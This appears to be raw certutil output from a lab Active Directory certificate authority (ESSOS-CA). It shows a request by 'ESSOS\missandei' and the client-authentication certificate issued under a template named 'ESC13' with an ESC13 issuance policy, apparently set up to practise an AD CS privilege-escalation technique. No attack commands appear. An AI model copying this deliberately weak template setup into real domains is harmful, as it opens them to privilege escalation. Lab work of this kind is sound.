  UPN                           User Principal Name           String  2048 -- Indexed
  DistinguishedName             Issued Distinguished Name     String  8192
  RawName                       Issued Binary Name            Binary  4096
  Country                       Issued Country/Region         String  8192
  Organization                  Issued Organization           String  8192
  OrgUnit                       Issued Organization Unit      String  8192
  CommonName                    Issued Common Name            String  8192 -- Indexed
  Locality                      Issued City                   String  8192
  State                         Issued State                  String  8192
  Title                         Issued Title                  String  8192
  GivenName                     Issued First Name             String  8192
  Initials                      Issued Initials               String  8192
  SurName                       Issued Last Name              String  8192
  DomainComponent               Issued Domain Component       String  8192
  EMail                         Issued Email Address          String  8192
  StreetAddress                 Issued Street Address         String  8192
  UnstructuredName              Issued Unstructured Name      String  8192
  UnstructuredAddress           Issued Unstructured Address   String  8192
  DeviceSerialNumber            Issued Device Serial Number   String  8192

Row 1:
  Request ID: 0x56 (86)
  Binary Request:
-----BEGIN NEW CERTIFICATE REQUEST-----
MIICWTCCAUECAQAwFDESMBAGA1UEAwwJTWlzc2FuZGVpMIIBIjANBgkqhkiG9w0B
AQEFAAOCAQ8AMIIBCgKCAQEAzpqvKB7vMyMTJPSCzsAhMMInRzKGWJ+yTk7KHhek
oJx9XJ5ktNAMbIi0mWWnAso2VKL+N2IyPPO/T3xWfSF1VnEg94MxOAoQIaUdrcwV
+ks7xN3BftnVo/Xndr1dooaIdCxc4k9/NOiYYP6hJu1lIFYiS+YGT/DKlh5fAH8B
P4hvu20Ob+Gv1xn31fsx7TpGqNrSz3I4ZU4VIIBAKrHjD6nM0oFZFGkVKT+GdMUE
AC5afTRFzhBRCc0qT7uVAiGsqR/ZSUIJRhbxxC4bXQxNQUgQ9qVRtEgadvl54YVw
kM3NOYTzVPT0L3eW1o5NxFy81jyxCG+P6vMDYyG9nKOn+wIDAQABoAAwDQYJKoZI
hvcNAQELBQADggEBAASP0691EmD/lE7RZJhDopjt1wq+EWpJ2sQlahFQ3dAy+uo7
dBpzSx2L5vL5HkIwhy3cWXORQxVNww65+bcOmHSN17JmHZpVZZBypE7AckDs6tVv
L4mBCIEy9C9D1HPc7OthU9tHopEdZHEZefe9vS1t5n0dOLVd5Tv/9OXxrhTy4Aw+
K+p/16PUiaTPVhWXwlCH2wJFcrIr6C1ajdfakvdGHN0MjtPrj5YDJmcj+2yBxC1X
pLre/MvCldTlZLI56lL2+v00znTTSBY/VXny6E06BrX8s26VJ8+j9LWTGkpDQQW5
LE1m7mXudRueQnT8IuZrFEIGBoNBtleZMZT7s8Q=
-----END NEW CERTIFICATE REQUEST-----

PKCS10 Certificate Request:
Version: 1
Subject:
    CN=Missandei
  Name Hash(sha1): 73b201da0129179bdd696d6c900725f8050e680d
  Name Hash(md5): c5dbb1a1886194636ca5616490e16faa

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA (RSA_SIGN)
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 ce 9a af 28 1e ef 33
    0010  23 13 24 f4 82 ce c0 21  30 c2 27 47 32 86 58 9f
    0020  b2 4e 4e ca 1e 17 a4 a0  9c 7d 5c 9e 64 b4 d0 0c
    0030  6c 88 b4 99 65 a7 02 ca  36 54 a2 fe 37 62 32 3c
    0040  f3 bf 4f 7c 56 7d 21 75  56 71 20 f7 83 31 38 0a
    0050  10 21 a5 1d ad cc 15 fa  4b 3b c4 dd c1 7e d9 d5
    0060  a3 f5 e7 76 bd 5d a2 86  88 74 2c 5c e2 4f 7f 34
    0070  e8 98 60 fe a1 26 ed 65  20 56 22 4b e6 06 4f f0
    0080  ca 96 1e 5f 00 7f 01 3f  88 6f bb 6d 0e 6f e1 af
    0090  d7 19 f7 d5 fb 31 ed 3a  46 a8 da d2 cf 72 38 65
    00a0  4e 15 20 80 40 2a b1 e3  0f a9 cc d2 81 59 14 69
    00b0  15 29 3f 86 74 c5 04 00  2e 5a 7d 34 45 ce 10 51
    00c0  09 cd 2a 4f bb 95 02 21  ac a9 1f d9 49 42 09 46
    00d0  16 f1 c4 2e 1b 5d 0c 4d  41 48 10 f6 a5 51 b4 48
    00e0  1a 76 f9 79 e1 85 70 90  cd cd 39 84 f3 54 f4 f4
    00f0  2f 77 96 d6 8e 4d c4 5c  bc d6 3c b1 08 6f 8f ea
    0100  f3 03 63 21 bd 9c a3 a7  fb 02 03 01 00 01
Request Attributes: 0
  0 attributes:
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  c4 b3 fb 94 31 99 57 b6  41 83 06 06 42 14 6b e6
    0010  22 fc 74 42 9e 1b 75 ee  65 ee 66 4d 2c b9 05 41
    0020  43 4a 1a 93 b5 f4 a3 cf  27 95 6e b3 fc b5 06 3a
    0030  4d e8 f2 79 55 3f 16 48  d3 74 ce 34 fd fa f6 52
    0040  ea 39 b2 64 e5 d4 95 c2  cb fc de ba a4 57 2d c4
    0050  81 6c fb 23 67 26 03 96  8f eb d3 8e 0c dd 1c 46
    0060  f7 92 da d7 8d 5a 2d e8  2b b2 72 45 02 db 87 50
    0070  c2 97 15 56 cf a4 89 d4  a3 d7 7f ea 2b 3e 0c e0
    0080  f2 14 ae f1 e5 f4 ff 3b  e5 5d b5 38 1d 7d e6 6d
    0090  2d bd bd f7 79 19 71 64  1d 91 a2 47 db 53 61 eb
    00a0  ec dc 73 d4 43 2f f4 32  81 08 81 89 2f 6f d5 ea
    00b0  ec 40 72 c0 4e a4 72 90  65 55 9a 1d 66 b2 d7 8d
    00c0  74 98 0e b7 f9 b9 0e c3  4d 15 43 91 73 59 dc 2d
    00d0  87 30 42 1e f9 f2 e6 8b  1d 4b 73 1a 74 3b ea fa
    00e0  32 d0 dd 50 11 6a 25 c4  da 49 6a 11 be 0a d7 ed
    00f0  98 a2 43 98 64 d1 4e 94  ff 60 12 75 af d3 8f 04
Signature matches Public Key
Key Id Hash(rfc-sha1): 956e992f727eb0d4b07d2619808e0d0b5511cfa2
Key Id Hash(sha1): d790e7d7aa515400d3a48fb7f2dc52516d2f2a43
Key Id Hash(bcrypt-sha1): 3035b3e41d737f92fa8d8fda25abe42dfb496b96
Key Id Hash(bcrypt-sha256): 37d81d32cf0c7c9fea5151500f0d3f839636cccef8af9d2aa75266c81a48c83b

  Archived Key: EMPTY
  Key Recovery Agent Hashes: EMPTY
  Old Certificate: EMPTY
  Request Attributes: "CertificateTemplate:ESC13"
0000    43 00 65 00 72 00 74 00  69 00 66 00 69 00 63 00   C.e.r.t.i.f.i.c.
0010    61 00 74 00 65 00 54 00  65 00 6d 00 70 00 6c 00   a.t.e.T.e.m.p.l.
0020    61 00 74 00 65 00 3a 00  45 00 53 00 43 00 31 00   a.t.e.:.E.S.C.1.
0030    33 00                                              3.

  Request Type: 0x100 (256) -- PKCS10
  Request Flags: 0x4 -- Force UTF-8
  Request Status Code: 0x0 (WIN32: 0) -- The operation completed successfully.
  Request Disposition: 0x14 (20) -- Issued
  Request Disposition Message: "Issued"
0000    49 00 73 00 73 00 75 00  65 00 64 00               I.s.s.u.e.d.

  Request Submission Date: 8/17/2025 7:34 PM GMT
  Request Resolution Date: 8/17/2025 7:34 PM GMT
  Revocation Date: EMPTY
  Effective Revocation Date: EMPTY
  Revocation Reason: EMPTY
  Requester Name: "ESSOS\missandei"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 6d 00 69 00   E.S.S.O.S.\.m.i.
0010    73 00 73 00 61 00 6e 00  64 00 65 00 69 00         s.s.a.n.d.e.i.

  Caller Name: "ESSOS\missandei"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 6d 00 69 00   E.S.S.O.S.\.m.i.
0010    73 00 73 00 61 00 6e 00  64 00 65 00 69 00         s.s.a.n.d.e.i.

  Signer Policies: EMPTY
  Signer Application Policies: EMPTY
  Officer: EMPTY
  Request Distinguished Name: "CN=Missandei"
0000    43 00 4e 00 3d 00 4d 00  69 00 73 00 73 00 61 00   C.N.=.M.i.s.s.a.
0010    6e 00 64 00 65 00 69 00                            n.d.e.i.

  Request Binary Name:
0000    30 14 31 12 30 10 06 03  55 04 03 0c 09 4d 69 73   0.1.0...U....Mis
0010    73 61 6e 64 65 69                                  sandei

  Request Country/Region: EMPTY
  Request Organization: EMPTY
  Request Organization Unit: EMPTY
  Request Common Name: "Missandei"
0000    4d 00 69 00 73 00 73 00  61 00 6e 00 64 00 65 00   M.i.s.s.a.n.d.e.
0010    69 00                                              i.

  Request City: EMPTY
  Request State: EMPTY
  Request Title: EMPTY
  Request First Name: EMPTY
  Request Initials: EMPTY
  Request Last Name: EMPTY
  Request Domain Component: EMPTY
  Request Email Address: EMPTY
  Request Street Address: EMPTY
  Request Unstructured Name: EMPTY
  Request Unstructured Address: EMPTY
  Request Device Serial Number: EMPTY
  Attestation Challenge: EMPTY
  Endorsement Key Hash: EMPTY
  Endorsement Certificate Hash: EMPTY
  Binary Precertificate: EMPTY
  Issued Request ID: 0x56 (86)
  Binary Certificate:
-----BEGIN CERTIFICATE-----
MIIF1TCCBL2gAwIBAgITIAAAAFZHRWI12m9KrQAAAAAAVjANBgkqhkiG9w0BAQsF
ADBBMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVlc3Nv
czERMA8GA1UEAxMIRVNTT1MtQ0EwHhcNMjUwODE3MTkyNDE2WhcNMjYwODE3MTky
NDE2WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzpqvKB7vMyMT
JPSCzsAhMMInRzKGWJ+yTk7KHhekoJx9XJ5ktNAMbIi0mWWnAso2VKL+N2IyPPO/
T3xWfSF1VnEg94MxOAoQIaUdrcwV+ks7xN3BftnVo/Xndr1dooaIdCxc4k9/NOiY
YP6hJu1lIFYiS+YGT/DKlh5fAH8BP4hvu20Ob+Gv1xn31fsx7TpGqNrSz3I4ZU4V
IIBAKrHjD6nM0oFZFGkVKT+GdMUEAC5afTRFzhBRCc0qT7uVAiGsqR/ZSUIJRhbx
xC4bXQxNQUgQ9qVRtEgadvl54YVwkM3NOYTzVPT0L3eW1o5NxFy81jyxCG+P6vMD
YyG9nKOn+wIDAQABo4IDBTCCAwEwHQYDVR0OBBYEFJVumS9yfrDUsH0mGYCODQtV
Ec+iMB8GA1UdIwQYMBaAFH1Oxx0zPzrvGpAOj09wpx5kq5TxMIHGBgNVHR8Egb4w
gbswgbiggbWggbKGga9sZGFwOi8vL0NOPUVTU09TLUNBLENOPWJyYWF2b3MsQ049
Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9ZXNzb3MsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0
aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6
BggrBgEFBQcBAQSBrTCBqjCBpwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPUVTU09T
LUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl
cyxDTj1Db25maWd1cmF0aW9uLERDPWVzc29zLERDPWxvY2FsP2NBQ2VydGlmaWNh
dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA4GA1Ud
DwEB/wQEAwIHgDA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiB7vNvhajTA4bx
hQbIk12HqJkqgXijzsZjhcfLYAIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcDAjAb
BgkrBgEEAYI3FQoEDjAMMAoGCCsGAQUFBwMCMDMGA1UdEQEB/wQpMCegJQYKKwYB
BAGCNxQCA6AXDBVtaXNzYW5kZWlAZXNzb3MubG9jYWwwTgYJKwYBBAGCNxkCBEEw
P6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTY2NjE5OTY4Mi0xNDExMzQyMTQ3
LTI5Mzg3MTc4NTUtMTExNzAzBgNVHSAELDAqMCgGJisGAQQBgjcVCIHu82+FqNMD
hvGFBsiTXYeomSqBeKCf9H+VoZ56MA0GCSqGSIb3DQEBCwUAA4IBAQCN6izRolrx
RLf/8Hy1pwwqecrcQUcZSqdUFRd9ZZGHvYSzY/2bjpD5pi+Z8uw3pv/Xf9hejDNK
tHxd6JRVehMIjOu78OeaZnISoG0bATlI3aUPUN2C3uaNFAjrNSsLtA5X451GCC5X
OyA119aQxEFbSCiVMxSGqFTWljvwahrZD8fPHFwl8sed9dTRfKxj7g4jmkRO8OJA
5IkwNJq/l9NiZ6fN3IJzc1b7tKwZi0+iYN6nc5u4zAlW8LRv8baiks69GFtn+SdW
Ro5ZUcxehT50WW/IfU1edkNxtJ6U71GsjAdce80mPKctLHGBcx5i+mzED5tYx05R
EmJc3Wdf4ByT
-----END CERTIFICATE-----

X509 Certificate:
Version: 3
Serial Number: 200000005647456235da6f4aad000000000056
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Issuer:
    CN=ESSOS-CA
    DC=essos
    DC=local
  Name Hash(sha1): c555fa55fe8e3e84d965d463e888a73d1877edbc
  Name Hash(md5): 26df41790381580445365a074ae47bac

 NotBefore: 8/17/2025 7:24 PM GMT
 NotAfter: 8/17/2026 7:24 PM GMT

Subject:
    EMPTY (Other Name:Principal Name=missandei@essos.local)
  Name Hash(sha1): f944dcd635f9801f7ac90a407fbc479964dec024
  Name Hash(md5): a46c3b54f2c9871cd81daf7a932499c0

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 ce 9a af 28 1e ef 33
    0010  23 13 24 f4 82 ce c0 21  30 c2 27 47 32 86 58 9f
    0020  b2 4e 4e ca 1e 17 a4 a0  9c 7d 5c 9e 64 b4 d0 0c
    0030  6c 88 b4 99 65 a7 02 ca  36 54 a2 fe 37 62 32 3c
    0040  f3 bf 4f 7c 56 7d 21 75  56 71 20 f7 83 31 38 0a
    0050  10 21 a5 1d ad cc 15 fa  4b 3b c4 dd c1 7e d9 d5
    0060  a3 f5 e7 76 bd 5d a2 86  88 74 2c 5c e2 4f 7f 34
    0070  e8 98 60 fe a1 26 ed 65  20 56 22 4b e6 06 4f f0
    0080  ca 96 1e 5f 00 7f 01 3f  88 6f bb 6d 0e 6f e1 af
    0090  d7 19 f7 d5 fb 31 ed 3a  46 a8 da d2 cf 72 38 65
    00a0  4e 15 20 80 40 2a b1 e3  0f a9 cc d2 81 59 14 69
    00b0  15 29 3f 86 74 c5 04 00  2e 5a 7d 34 45 ce 10 51
    00c0  09 cd 2a 4f bb 95 02 21  ac a9 1f d9 49 42 09 46
    00d0  16 f1 c4 2e 1b 5d 0c 4d  41 48 10 f6 a5 51 b4 48
    00e0  1a 76 f9 79 e1 85 70 90  cd cd 39 84 f3 54 f4 f4
    00f0  2f 77 96 d6 8e 4d c4 5c  bc d6 3c b1 08 6f 8f ea
    0100  f3 03 63 21 bd 9c a3 a7  fb 02 03 01 00 01
Certificate Extensions: 11
    2.5.29.14: Flags = 0, Length = 16
    Subject Key Identifier
        956e992f727eb0d4b07d2619808e0d0b5511cfa2

    2.5.29.35: Flags = 0, Length = 18
    Authority Key Identifier
        KeyID=7d4ec71d333f3aef1a900e8f4f70a71e64ab94f1

    2.5.29.31: Flags = 0, Length = be
    CRL Distribution Points
        [1]CRL Distribution Point
             Distribution Point Name:
                  Full Name:
                       URL=ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint (ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint)

    1.3.6.1.5.5.7.1.1: Flags = 0, Length = ad
    Authority Information Access
        [1]Authority Info Access
             Access Method=Certification Authority Issuer (1.3.6.1.5.5.7.48.2)
             Alternative Name:
                  URL=ldap:///CN=ESSOS-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority (ldap:///CN=ESSOS-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority)

    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature (80)

    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 30
    Certificate Template Information
        Template=ESC13(1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.74687331.11658720)
        Major Version Number=100
        Minor Version Number=4

    2.5.29.37: Flags = 0, Length = c
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)

    1.3.6.1.4.1.311.21.10: Flags = 0, Length = e
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Client Authentication

    2.5.29.17: Flags = 1(Critical), Length = 29
    Subject Alternative Name
        Other Name:
             Principal Name=missandei@essos.local

    1.3.6.1.4.1.311.25.2: Flags = 0, Length = 41

    0000  30 3f a0 3d 06 0a 2b 06  01 04 01 82 37 19 02 01   0?.=..+.....7...
    0010  a0 2f 04 2d 53 2d 31 2d  35 2d 32 31 2d 36 36 36   ./.-S-1-5-21-666
    0020  31 39 39 36 38 32 2d 31  34 31 31 33 34 32 31 34   199682-141134214
    0030  37 2d 32 39 33 38 37 31  37 38 35 35 2d 31 31 31   7-2938717855-111
    0040  37                                                 7
0000: 30 3f                                     ; SEQUENCE (3f Bytes)
0002:    a0 3d                                  ; OPTIONAL[0] (3d Bytes)
0004:       06 0a                               ; OBJECT_ID (a Bytes)
0006:       |  2b 06 01 04 01 82 37 19  02 01
            |     ; 1.3.6.1.4.1.311.25.2.1
0010:       a0 2f                               ; OPTIONAL[0] (2f Bytes)
0012:          04 2d                            ; OCTET_STRING (2d Bytes)
0014:             53 2d 31 2d 35 2d 32 31  2d 36 36 36 31 39 39 36  ; S-1-5-21-6661996
0024:             38 32 2d 31 34 31 31 33  34 32 31 34 37 2d 32 39  ; 82-1411342147-29
0034:             33 38 37 31 37 38 35 35  2d 31 31 31 37           ; 38717855-1117

    2.5.29.32: Flags = 0, Length = 2c
    Certificate Policies
        [1]Certificate Policy:
             Policy Identifier=IssuancePolicyESC13

Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  93 1c e0 5f 67 dd 5c 62  12 51 4e c7 58 9b 0f c4
    0010  6c fa 62 1e 73 81 71 2c  2d a7 3c 26 cd 7b 5c 07
    0020  8c ac 51 ef 94 9e b4 71  43 76 5e 4d 7d c8 6f 59
    0030  74 3e 85 5e cc 51 59 8e  46 56 27 f9 67 5b 18 bd
    0040  ce 92 a2 b6 f1 6f b4 f0  56 09 cc b8 9b 73 a7 de
    0050  60 a2 4f 8b 19 ac b4 fb  56 73 73 82 dc cd a7 67
    0060  62 d3 97 bf 9a 34 30 89  e4 40 e2 f0 4e 44 9a 23
    0070  0e ee 63 ac 7c d1 d4 f5  9d c7 f2 25 5c 1c cf c7
    0080  0f d9 1a 6a f0 3b 96 d6  54 a8 86 14 33 95 28 48
    0090  5b 41 c4 90 d6 d7 35 20  3b 57 2e 08 46 9d e3 57
    00a0  0e b4 0b 2b 35 eb 08 14  8d e6 de 82 dd 50 0f a5
    00b0  dd 48 39 01 1b 6d a0 12  72 66 9a e7 f0 bb eb 8c
    00c0  08 13 7a 55 94 e8 5d 7c  b4 4a 33 8c 5e d8 7f d7
    00d0  ff a6 37 ec f2 99 2f a6  f9 90 8e 9b fd 63 b3 84
    00e0  bd 87 91 65 7d 17 15 54  a7 4a 19 47 41 dc ca 79
    00f0  2a 0c a7 b5 7c f0 ff b7  44 f1 5a a2 d1 2c ea 8d
Non-root Certificate
Key Id Hash(rfc-sha1): 956e992f727eb0d4b07d2619808e0d0b5511cfa2
Key Id Hash(sha1): d790e7d7aa515400d3a48fb7f2dc52516d2f2a43
Key Id Hash(bcrypt-sha1): 3035b3e41d737f92fa8d8fda25abe42dfb496b96
Key Id Hash(bcrypt-sha256): 37d81d32cf0c7c9fea5151500f0d3f839636cccef8af9d2aa75266c81a48c83b
Key Id Hash(md5): 5e891c59251657b182f24c58a6de8f83
Key Id Hash(sha256): cefd889a6b421783b6d1ae12b67c059ecd76dbad5e59986e9531d8293131eaae
Key Id Hash(pin-sha256): JErcUsc0ecqMtGp1nVvU8FRbNgcVXghkP2oe3mg4rvo=
Key Id Hash(pin-sha256-hex): 244adc52c73479ca8cb46a759d5bd4f0545b3607155e08643f6a1ede6838aefa
Cert Hash(md5): 7dbce8ad4122f9feffa53444cb9f158f
Cert Hash(sha1): 4231d56bb0f61260e1c1a74d64cbcf0f29a1f3bb
Cert Hash(sha256): 9230bf42dc31f6d1c3574d3f0d27cd6ae405b881f10719180ad92490cc315194
Signature Hash: 120c86f5661234648828ffe814f6b849e51a3a30fbf123224bef29fccc6f947b

  Certificate Hash: "42 31 d5 6b b0 f6 12 60 e1 c1 a7 4d 64 cb cf 0f 29 a1 f3 bb"
0000    34 00 32 00 20 00 33 00  31 00 20 00 64 00 35 00   4.2. .3.1. .d.5.
0010    20 00 36 00 62 00 20 00  62 00 30 00 20 00 66 00    .6.b. .b.0. .f.
0020    36 00 20 00 31 00 32 00  20 00 36 00 30 00 20 00   6. .1.2. .6.0. .
0030    65 00 31 00 20 00 63 00  31 00 20 00 61 00 37 00   e.1. .c.1. .a.7.
0040    20 00 34 00 64 00 20 00  36 00 34 00 20 00 63 00    .4.d. .6.4. .c.
0050    62 00 20 00 63 00 66 00  20 00 30 00 66 00 20 00   b. .c.f. .0.f. .
0060    32 00 39 00 20 00 61 00  31 00 20 00 66 00 33 00   2.9. .a.1. .f.3.
0070    20 00 62 00 62 00                                   .b.b.

  Certificate Template: "1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.74687331.11658720" ESC13
0000    31 00 2e 00 33 00 2e 00  36 00 2e 00 31 00 2e 00   1...3...6...1...
0010    34 00 2e 00 31 00 2e 00  33 00 31 00 31 00 2e 00   4...1...3.1.1...
0020    32 00 31 00 2e 00 38 00  2e 00 33 00 39 00 31 00   2.1...8...3.9.1.
0030    34 00 32 00 32 00 33 00  2e 00 31 00 31 00 31 00   4.2.2.3...1.1.1.
0040    35 00 31 00 37 00 34 00  37 00 2e 00 31 00 34 00   5.1.7.4.7...1.4.
0050    34 00 33 00 34 00 39 00  35 00 30 00 2e 00 31 00   4.3.4.9.5.0...1.
0060    31 00 38 00 32 00 31 00  37 00 33 00 2e 00 31 00   1.8.2.1.7.3...1.
0070    35 00 33 00 33 00 38 00  36 00 36 00 36 00 2e 00   5.3.3.8.6.6.6...
0080    32 00 34 00 38 00 2e 00  37 00 34 00 36 00 38 00   2.4.8...7.4.6.8.
0090    37 00 33 00 33 00 31 00  2e 00 31 00 31 00 36 00   7.3.3.1...1.1.6.
00a0    35 00 38 00 37 00 32 00  30 00                     5.8.7.2.0.

  Template Enrollment Flags: 0x0
      (CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1)
      (CT_FLAG_PEND_ALL_REQUESTS -- 2)
      (CT_FLAG_PUBLISH_TO_KRA_CONTAINER -- 4)
      (CT_FLAG_PUBLISH_TO_DS -- 8)
      (CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16))
      (CT_FLAG_AUTO_ENROLLMENT -- 20 (32))
      (CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT -- 40 (64))
      (CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED -- 80 (128))
      (CT_FLAG_USER_INTERACTION_REQUIRED -- 100 (256))
      (CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512))
      (CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE -- 400 (1024))
      (CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF -- 800 (2048))
      (CT_FLAG_ADD_OCSP_NOCHECK -- 1000 (4096))
      (CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL -- 2000 (8192))
      (CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS -- 4000 (16384))
      (CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS -- 8000 (32768))
      (CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT -- 10000 (65536))
      (CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST -- 20000 (131072))
      (CT_FLAG_SKIP_AUTO_RENEWAL -- 40000 (262144))
  Template General Flags: 0x20220 (131616)
      (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1)
      (CT_FLAG_ADD_EMAIL -- 2)
      (CT_FLAG_ADD_OBJ_GUID -- 4)
      (CT_FLAG_PUBLISH_TO_DS -- 8)
      (CT_FLAG_EXPORTABLE_KEY -- 10 (16))
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
      (CT_FLAG_MACHINE_TYPE -- 40 (64))
      (CT_FLAG_IS_CA -- 80 (128))
      (CT_FLAG_ADD_DIRECTORY_PATH -- 100 (256))
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
      (CT_FLAG_ADD_SUBJECT_DIRECTORY_PATH -- 400 (1024))
      (CT_FLAG_IS_CROSS_CA -- 800 (2048))
      (CT_FLAG_DONOTPERSISTINDB -- 1000 (4096))
      (CT_FLAG_IS_DEFAULT -- 10000 (65536))
    CT_FLAG_IS_MODIFIED -- 20000 (131072)
      (CT_FLAG_IS_DELETED -- 40000 (262144))
      (CT_FLAG_POLICY_MISMATCH -- 80000 (524288))
  Template Private Key Flags: 0x1010000 (16842752)
      (CTPRIVATEKEY_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL -- 1)
      (CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16))
      (CTPRIVATEKEY_FLAG_STRONG_KEY_PROTECTION_REQUIRED -- 20 (32))
      (CTPRIVATEKEY_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM -- 40 (64))
      (CTPRIVATEKEY_FLAG_REQUIRE_SAME_KEY_RENEWAL -- 80 (128))
      (CTPRIVATEKEY_FLAG_USE_LEGACY_PROVIDER -- 100 (256))
      (CTPRIVATEKEY_FLAG_EK_TRUST_ON_USE -- 200 (512))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_CERT -- 400 (1024))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_KEY -- 800 (2048))
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
      (CTPRIVATEKEY_FLAG_ATTEST_PREFERRED -- 1000 (4096))
      (CTPRIVATEKEY_FLAG_ATTEST_REQUIRED -- 2000 (8192))
      (CTPRIVATEKEY_FLAG_ATTEST_WITHOUT_POLICY -- 4000 (16384))
      (TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0)
    TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
      (TEMPLATE_SERVER_VER_2008<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 20000 (131072))
      (TEMPLATE_SERVER_VER_2008R2<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 30000 (196608))
      (TEMPLATE_SERVER_VER_WIN8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 40000 (262144))
      (TEMPLATE_SERVER_VER_WINBLUE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 50000 (327680))
      (TEMPLATE_SERVER_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 60000 (393216))
      (V7<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 70000 (458752))
      (V8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 80000 (524288))
      (V9<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 90000 (589824))
      (V10<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- a0000 (655360))
      (V11<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- b0000 (720896))
      (V12<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- c0000 (786432))
      (V13<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- d0000 (851968))
      (V14<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- e0000 (917504))
      (V15<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- f0000 (983040))
      (CTPRIVATEKEY_FLAG_HELLO_KSP_KEY -- 100000 (1048576))
      (CTPRIVATEKEY_FLAG_HELLO_LOGON_KEY -- 200000 (2097152))
      (TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0)
    TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)
      (TEMPLATE_CLIENT_VER_VISTA<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 2000000 (33554432))
